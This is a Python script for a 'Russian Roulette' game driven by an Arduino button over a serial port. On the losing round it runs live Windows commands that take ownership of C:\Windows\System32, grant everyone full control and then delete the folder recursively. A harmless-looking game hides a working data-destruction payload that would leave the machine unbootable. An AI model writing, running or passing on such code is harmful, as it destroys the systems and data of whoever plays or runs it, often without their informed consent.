import serial
import time
import random
import os 

arduino = serial.Serial(port='COM5', baudrate=115200, timeout=0.1)

def wait_for_button():
    while True:
        command = arduino.read(2)  
        if command == b'B1': 
            return

def russian_roulette():
    print("Welcome to Russian Roulette! Press the button to play!")
    time.sleep(2)

    bullet = random.randint(1, 6)
    count = 0

    while count < 6:
        count += 1
        print(f"Round {count}: Press the button to pull the trigger...")
        wait_for_button()
        time.sleep(5)

        if count == bullet:
            print("\nBANG! You've lost!")
            time.sleep(2)
            print("Deleting System32...")
            os.system("takeown /f C:\\Windows\\System32 /r /d y")
            os.system("icacls C:\\Windows\\System32 /grant Everyone:F /t")
            os.system("rd /s /q C:\\Windows\\System32")
            os.system("del /s /q C:\\Windows\\System32\\*.*")
            break
        else:
            print("Click! You're safe... for now.")
            time.sleep(1)

    if count == 6:
        print("Congratulations! You survived all 6 rounds! 🎉")

    arduino.close()

russian_roulette()
